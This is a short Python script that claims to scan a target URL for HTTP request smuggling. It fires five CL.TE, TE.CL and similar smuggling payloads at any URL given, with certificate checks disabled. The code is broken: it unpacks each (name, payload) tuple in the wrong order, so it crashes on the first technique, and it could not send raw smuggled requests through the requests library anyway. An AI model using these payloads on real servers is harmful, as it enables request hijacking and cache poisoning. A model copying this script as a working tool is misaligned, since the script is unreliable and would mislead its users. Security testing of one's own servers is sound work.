#! /usr/bin/env python3
# -*- coding: utf-8 -*-
# Author: cbk914
import requests
import argparse

# Define the argument parser
parser = argparse.ArgumentParser(description="Check a URL for request smuggling vulnerabilities.")
parser.add_argument("-u", "--url", help="The target URL", required=True)
parser.add_argument("-d", "--debug", help="Print debug information", action="store_true")
args = parser.parse_args()

# Define the request smuggling techniques to try
techniques = [
    ("TE", "Transfer-Encoding: chunked\r\nTransfer-Encoding: identity"),
    ("CL.TE", "Content-Length: 0\r\nTransfer-Encoding: chunked\r\n\r\n1\r\nZ\r\nQ"),
    ("TE.CL", "Transfer-Encoding: chunked\r\nContent-Length: 3\r\n\r\nZ\r\n0\r\n\r\n"),
    ("FE", "Transfer-Encoding: chunked\r\nContent-Length: 4\r\n\r\n0\r\nGET / HTTP/1.1\r\n\r\n"),
    ("CRLF", "Transfer-Encoding: chunked\r\nContent-Length: 4\r\n\r\n0\r\n\r\nHTTP/1.1 200 OK\r\n\r\n")
]

# Set up the requests session
session = requests.Session()
session.verify = False

# Send a request with a custom payload and check the response
def check_technique(technique):
    if len(technique) != 2:
        raise ValueError("Invalid technique format. Each technique must be a tuple of (payload, expected_response).")
    payload, expected_response = technique
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    headers[payload.split(": ")[0]] = payload.split(": ")[1]
    try:
        response = session.post(args.url, headers=headers, data=payload)
    except Exception as e:
        if args.debug:
            print(f"Request error: {e}")
        return False
    if args.debug:
        print(f"Response status code: {response.status_code}")
        print(f"Response content: {response.content}")
    if expected_response in response.content.decode():
        print(f"Request smuggling vulnerability found using {payload.split(':')[0]} technique")
        return True
    return False

# Try all the techniques and print a message if any are successful
technique_found = False
for technique in techniques:
    if check_technique(technique):
        technique_found = True

# Print a message if no vulnerability is found
if not technique_found:
    print("No vulnerability found")
